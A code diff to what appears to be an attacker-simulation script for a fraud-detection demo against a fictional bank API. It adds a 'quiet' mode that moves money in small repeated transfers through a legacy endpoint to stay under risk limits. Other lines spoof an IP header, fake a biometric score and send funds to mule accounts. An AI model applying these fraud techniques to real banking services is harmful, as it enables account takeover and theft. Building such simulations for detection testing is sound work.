@@ -24,6 +24,33 @@ def say(msg: str, delay: float = 0.0):
     time.sleep(delay)
 
 
+def stop_if_blocked(r: httpx.Response):
+    if r.status_code == 403 and "session_blocked" in r.text:
+        say(f"{R}{B}403 session_blocked. They spotted me. Moving on to another bank.{X}")
+        sys.exit(0)
+
+
+def quiet(bank: httpx.Client, a) -> None:
+    """A week later: someone who read the first attacker's notes. Stolen phone, small amounts, straight to /v1."""
+    say(f"{D}a week later · stolen phone, small domestic transfers, straight to the legacy API{X}", 0.8)
+    login(bank, a.customer, "iphone15pro-ahmed")
+    say(f"{G}session issued on the customer's own phone{X}", 0.5)
+    acc = bank.get("/v2/accounts").json()["accounts"][0]
+    say(f"account {acc['id']} · balance {B}AED {acc['balance']:,.2f}{X}", 0.8)
+    total = 0
+    for _ in range(a.quiet_n):
+        r = bank.post("/v1/transfers", json={"from_account": acc["id"], "to_iban": "AE330400000987654321001",
+                                             "to_name": "Yousef M. General Trading", "country": "AE", "amount": 9_000,
+                                             "reference": "invoice"})
+        stop_if_blocked(r)
+        if r.status_code != 200:
+            say(f"{R}{r.status_code} {r.text[:80]}{X}")
+            break
+        total += 9_000
+        say(f"{G}APPROVED{X} AED     9,000 → Yousef M. General Trading    AE33…  balance AED {r.json()['balance_after']:,.2f}", a.quiet_pace)
+    print(f"\n{B}{G}  DONE: AED {total:,.0f} moved out, nobody noticed{X}\n")
+
+
 def login(bank: httpx.Client, customer: str = "C-1001", device: str = DEVICE) -> None:
     r = bank.post("/v2/auth/login", json={"customer_id": customer, "device_id": device,
                                           "biometric_score": 0.998, "kyc_video_passed": True})
@@ -35,6 +62,7 @@ def send(bank, acc, name, iban, country, amount, pace, phone=None) -> float | No
     body = {"from_account": acc, "to_iban": iban, "to_name": name, "country": country, "amount": amount,
             "reference": REFERENCE.get(country, "INV-2026-11")}
     r = bank.post("/v1/transfers", json=body)
+    stop_if_blocked(r)
     if r.status_code == 409 and phone:
         fields = r.json()["detail"]["fields"]
         say(f"{Y}409 bank wants {', '.join(fields)}. Filling in the mule's details...{X}", pace)
@@ -55,6 +83,9 @@ def main():
     ap.add_argument("--customer", default="C-1001")
     ap.add_argument("--device", default=DEVICE)
     ap.add_argument("--ip", default="185.220.101.47")
+    ap.add_argument("--quiet", action="store_true", help="a careful attacker who stays under the risk threshold")
+    ap.add_argument("--quiet-n", type=int, default=5)
+    ap.add_argument("--quiet-pace", type=float, default=2.8)
     a = ap.parse_args()
     headers = {"User-Agent": "okhttp/4.9.3", "X-Forwarded-For": a.ip}
     if a.canary:
@@ -62,6 +93,8 @@ def main():
     bank = httpx.Client(base_url=a.bank, headers=headers, timeout=30)
 
     print(f"\n{B}{R}  TARGET: Desert Bank · customer {a.customer}{X}\n")
+    if a.quiet:
+        return quiet(bank, a)
     say(f"{D}logging in as {a.customer} with a deepfaked selfie...{X}", 1.0)
     login(bank, a.customer, a.device)
     say(f"{G}session issued{X}", 0.6)
@@ -70,6 +103,7 @@ def main():
 
     r = bank.post("/v2/transfers", json={"from_account": acc["id"], "to_iban": MULES[0][1], "to_name": MULES[0][0],
                                          "country": MULES[0][2], "amount": 50_000})
+    stop_if_blocked(r)
     if r.status_code == 403:
         say(f"{Y}/v2/transfers → 403 step_up_required. Trying the legacy API...{X}", 0.8)
 
